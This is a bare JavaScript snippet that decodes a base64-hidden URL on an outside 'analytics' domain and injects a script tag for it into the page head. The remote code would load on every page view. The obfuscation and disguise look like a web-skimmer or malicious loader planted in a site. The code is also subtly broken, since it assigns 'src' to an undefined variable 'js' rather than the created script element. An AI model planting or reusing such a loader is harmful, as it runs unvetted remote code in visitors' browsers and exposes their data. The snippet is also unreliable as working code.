var string = 'aHR0cHM6Ly9hbmFseXRpY3Muc2hvcHN0YXQxLmNvbS9kYXRlanMuanM=';
var decodedString = atob(string);


var script = document.createElement('script');
js.src = ''+ decodedString +'';
document.getElementsByTagName('head')[0].appendChild(script);
